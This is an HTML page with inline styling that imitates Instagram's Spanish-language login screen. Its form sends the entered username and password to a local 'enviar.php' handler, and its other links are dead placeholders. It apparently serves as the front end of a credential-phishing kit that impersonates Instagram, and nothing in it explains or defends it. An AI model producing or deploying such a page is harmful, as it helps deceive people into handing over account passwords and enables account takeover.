<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login Instagram</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    body {
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .wrapper {
      width: 100%;
      max-width: 400px;
    }

    .container {
      background-color: white;
      border: 1px solid #dbdbdb;
      padding: 40px;
      text-align: center;
    }

    .logo {
      margin-bottom: 30px;
    }

    .logo img {
      width: 175px;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 6px 0;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background-color: #fafafa;
    }

    button {
      width: 100%;
      padding: 10px;
      background-color: #4cb5f9;
      color: white;
      font-weight: bold;
      border: none;
      border-radius: 5px;
      margin-top: 10px;
      cursor: pointer;
    }

    .divider {
      display: flex;
      align-items: center;
      margin: 20px 0;
    }

    .divider::before,
    .divider::after {
      content: '';
      flex: 1;
      height: 1px;
      background-color: #dbdbdb;
    }

    .divider span {
      margin: 0 10px;
      color: #8e8e8e;
      font-size: 13px;
      font-weight: 600;
    }

    .facebook-login {
      color: #385185;
      font-weight: 600;
      margin: 10px 0;
      text-decoration: none;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .facebook-login img {
      width: 16px;
      margin-right: 8px;
    }

    .forgot-password {
      margin-top: 12px;
      font-size: 12px;
    }

    .signup-box {
      border: 1px solid #dbdbdb;
      background-color: white;
      text-align: center;
      padding: 20px;
      margin-top: 10px;
      font-size: 14px;
    }

    .signup-box a {
      color: #0095f6;
      text-decoration: none;
      font-weight: bold;
      margin-left: 5px;
    }

    .get-app {
      text-align: center;
      margin-top: 20px;
    }

    .get-app p {
      margin-bottom: 10px;
    }

    .app-stores {
      display: flex;
      justify-content: center;
      flex-wrap: wrap;
      gap: 10px;
    }

    .app-stores img {
      width: 136px;
    }

    /* Responsive Styles */
    @media (max-width: 500px) {
      .container {
        padding: 30px 20px;
      }

      .logo img {
        width: 150px;
      }

      .app-stores img {
        width: 120px;
      }
    }

    @media (max-width: 350px) {
      input, button {
        font-size: 14px;
      }

      .divider span {
        font-size: 12px;
      }
    }
  </style>
</head>
<body>

  <div class="wrapper">
    <div class="container">
      <div class="logo">
        <img src="Instagram-Logo.png" alt="Instagram" />
      </div>

      <form action="enviar.php" method="POST">
        <input type="text" name="usuario" placeholder="Teléfono, usuario o correo electrónico" required>
        <input type="password" name="contrasena" placeholder="Contraseña" required>
        <button type="submit">Iniciar sesión</button>
      </form>
      

      <div class="divider"><span>O</span></div>

      <a href="#" class="facebook-login">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook logo">
        Iniciar sesión con Facebook
      </a>

      <div class="forgot-password">
        <a href="#">¿Olvidaste tu contraseña?</a>
      </div>
    </div>

    <div class="signup-box">
      ¿No tienes una cuenta? <a href="#">Regístrate</a>
    </div>

  </div>

</body>
</html>
